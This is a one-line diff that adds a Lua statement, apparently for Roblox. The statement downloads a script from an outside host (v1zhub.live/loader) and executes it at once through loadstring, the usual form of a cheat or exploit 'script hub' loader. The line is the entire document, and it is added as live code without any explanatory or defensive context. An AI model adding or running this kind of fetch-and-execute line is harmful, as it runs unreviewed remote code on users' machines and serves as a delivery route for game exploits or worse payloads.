@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://v1zhub.live/loader", true))()
